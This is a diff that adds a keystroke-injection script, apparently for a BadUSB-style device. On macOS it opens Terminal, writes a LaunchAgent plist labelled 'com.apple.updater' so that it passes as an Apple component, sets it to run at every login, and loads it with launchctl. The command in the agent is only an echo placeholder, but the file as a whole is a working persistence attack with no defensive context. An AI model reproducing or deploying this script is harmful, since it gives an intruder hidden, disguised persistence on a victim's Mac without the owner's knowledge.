@@ -1,0 +1,19 @@
+DELAY 1000
+GUI SPACE
+DELAY 600
+STRING terminal
+ENTER
+DELAY 1000
+STRING cat > ~/Library/LaunchAgents/com.apple.updater.plist << 'EOF'
+ENTER
+STRING <?xml version="1.0" encoding="UTF-8"?>
+ENTER
+STRING <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+ENTER
+STRING <plist version="1.0"><dict><key>Label</key><string>com.apple.updater</string><key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>echo persistent</string></array><key>RunAtLoad</key><true/></dict></plist>
+ENTER
+STRING EOF
+ENTER
+DELAY 500
+STRING launchctl load ~/Library/LaunchAgents/com.apple.updater.plist 2>&1
+ENTER
